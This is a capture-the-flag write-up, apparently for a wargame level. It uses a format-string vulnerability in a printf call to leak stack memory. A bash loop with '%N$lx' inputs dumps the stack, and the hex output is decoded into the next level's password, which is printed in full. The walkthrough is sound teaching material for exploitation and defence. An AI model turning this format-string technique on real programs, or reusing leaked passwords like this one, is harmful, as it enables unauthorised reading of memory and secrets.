
In this program, the vulnerability we will exploit is in the printf function.
```c
printf(&var);
```
which will allow us to read from the stack, considering that the flag is also located in the stack.

```c
FILE* rax = fopen("/home/users/level03/.pass", &data_400bb0);
    if (rax == 0)
    {
        fwrite("ERROR: failed to open password f…", 1, 0x24, stderr);
        exit(1);
        /* no return */
    }
    int32_t rax_1 = fread(&var_a8, 1, 0x29, rax);
```

```asm
Dump of assembler code for function main:
   0x0000000000400814 <+0>:     push   %rbp
   0x0000000000400815 <+1>:     mov    %rsp,%rbp
   0x0000000000400818 <+4>:     sub    $0x120,%rsp
```

Therefore, knowing that my stack has a size of 0x120 (288) and that we are in 64 bits, we know that the flag will be within the range of 0-36.

```
for i in {1..36}; do echo -n "$i " && echo "%${i}\$lx" | ./level02 | awk 'NR==6'; done
1 7fffffffe4f0 does not have access!
2 0 does not have access!
3 0 does not have access!
4 2a2a2a2a2a2a2a2a does not have access!
5 2a2a2a2a2a2a2a2a does not have access!
6 7fffffffe6e8 does not have access!
7 1f7ff9a08 does not have access!
8 0 does not have access!
9 0 does not have access!
10 0 does not have access!
11 0 does not have access!
12 0 does not have access!
13 0 does not have access!
14 0 does not have access!
15 0 does not have access!
16 0 does not have access!
17 0 does not have access!
18 0 does not have access!
19 0 does not have access!
20 100000000 does not have access!
21 0 does not have access!
22 756e505234376848 does not have access! <-------------------------
23 45414a3561733951 does not have access!
24 377a7143574e6758 does not have access!
25 354a35686e475873 does not have access!
26 48336750664b394d does not have access! <-------------------------
27 0 does not have access!
28 786c24383225 does not have access!
29 0 does not have access!
30 0 does not have access!
31 0 does not have access!
32 0 does not have access!
33 0 does not have access!
34 0 does not have access!
35 0 does not have access!
36 0 does not have access!
```

We can see that from 22 to 26, we have a sequence of elements, and our flags consist of 40 bytes (5 * 8). It's convenient since we have a sequence of 5.
Knowing that we are in little endian, if we convert it to ASCII, we retrieve our flag.

```
756e505234376848 become "Hh74RPnu"
45414a3561733951 become "Q9sa5JAE"
377a7143574e6758 become "XgNWCqz7"
354a35686e475873 become "sXGnh5J5"
48336750664b394d become "M9KfPg3H"
```

flag: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H